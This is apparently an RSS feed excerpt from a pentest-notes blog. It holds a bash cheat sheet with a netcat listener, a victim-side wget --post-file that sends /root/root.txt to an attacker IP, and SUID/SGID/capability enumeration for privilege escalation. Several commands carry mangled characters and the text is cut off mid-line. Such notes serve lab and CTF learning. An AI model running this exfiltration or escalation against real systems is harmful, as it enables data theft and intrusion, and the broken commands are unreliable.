channel.title: Nc on pentest notes
channel.description: Recent content in Nc on pentest notes

item.title: Bash commands
item.description: #www server python -m SimpleHTTPServer 8000 #on our kali machine we run: nc -lvnp 7734 #On the victim machine we run: sudo wget –post-file=/root/root.txt 10.10.14.4:7734 #curl download curl http://some.url –output some.file #Sort ls -ltr #wrap ps commands ps auxww #remove all before cat lists |sed ’s/^.*://’ > md5 awk -F “:” ‘{print $1}’ /etc/passwd #capabilities getcap -r / 2/dev/null #grep recursive grep -RIlm1 "bash" /skrypty/ #sticky bit find / -perm -1000 -type d -exec la -la {} \; 2/dev/null #sgid chmod 2000 find / -perm -g=s -type f -exec ls -la {} \; 2/dev/null #SUID chmod 4000 find / -perm -u=s -type f -exec ls -la {} \; 2/dev/null find / -user root -perm -o=w -type f -not -path "

item.title: Shell reverse
